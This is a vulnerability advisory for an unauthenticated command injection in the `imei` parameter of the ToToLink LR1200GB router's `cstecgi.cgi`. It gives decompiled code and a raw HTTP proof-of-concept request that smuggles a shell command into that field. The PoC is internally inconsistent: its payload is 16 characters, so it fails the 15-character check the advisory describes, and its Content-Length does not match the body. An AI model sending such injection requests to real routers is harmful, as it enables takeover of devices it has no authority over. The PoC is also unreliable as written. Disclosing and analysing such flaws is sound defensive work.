# Command Injection Vulnerability in `imei`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | ToToLink LR1200GB Router                                     |
| Firmware Version     | **V9.1.0u.6619_B20230130**                                   |
| Vulnerability Type   | **Remote Command Injection**                                 |
| Vulnerable Component | `cstecgi.cgi` (handling of `imei` parameter via `websGetVar`) |
| Prerequisites        | Remote access to the device's web interface (no authentication required) |

2. Exploitation Path

```c
int __fastcall sub_41EC68(int a1)
{
  ...
  Var = websGetVar(a1, "imei", (int)&byte_439510);
  if ( strlen(Var) == 15 )
  {
    sprintf(v4, "cli_atc at+EGMR=1,7,\\\"%s\\\" ", Var);
    system(v4);
    ...
}
```

3. **Vulnerable Binaries:** `cstecgi.cgi`.
4. 0-Day Command Injection Exploitation Path: In `cstecgi.cgi`, at line 5, `Var = websGetVar(a1, "imei", (int)&byte_439510)` receives data and only performs a length check, without filtering any sensitive characters. At line 8, `printf(v4, "cli_atc at+EGMR=1,7,\\\"%s\\\" ", Var)` concatenates the string, which is then directly passed to `system(v4)` at line 9, resulting in a command injection vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerabilities:

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: curl/7.81.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close

imei=123456;uname -a;
```